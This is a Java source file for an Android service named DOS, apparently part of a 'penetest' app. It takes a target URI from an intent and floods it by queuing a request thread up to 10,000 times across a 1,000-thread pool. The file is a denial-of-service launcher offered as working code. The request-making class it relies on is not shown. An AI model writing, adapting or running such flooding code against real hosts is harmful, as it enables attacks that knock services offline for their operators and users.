package com.ricochet.penetest;

import android.app.IntentService;
import android.content.Intent;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Created by user on 2016/8/14.
 */
public class DOS extends IntentService {
    public DOS() {
        super("DOS");
    }

    ExecutorService es;
    Thread thread;
    Mythread mythread;
    int flag = 0;

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            mythread = new Mythread(intent.getStringExtra("URI"));
            thread = new Thread(mythread);
            es = Executors.newFixedThreadPool(1000);
            for (int i = 0; i < 10000; i++) {
                es.execute(thread);
                if (flag == 1) {
                    break;
                }
            }
            while (!Thread.currentThread().isInterrupted())
                Thread.currentThread().interrupt();
            thread.interrupt();
            es.shutdownNow();
        }
        catch (Exception e) {
        }

    }

    @Override
    public void onDestroy() {
        flag = 1;
        while (!Thread.currentThread().isInterrupted())
            Thread.currentThread().interrupt();
        thread.interrupt();
        es.shutdownNow();
        super.onDestroy();
    }
}

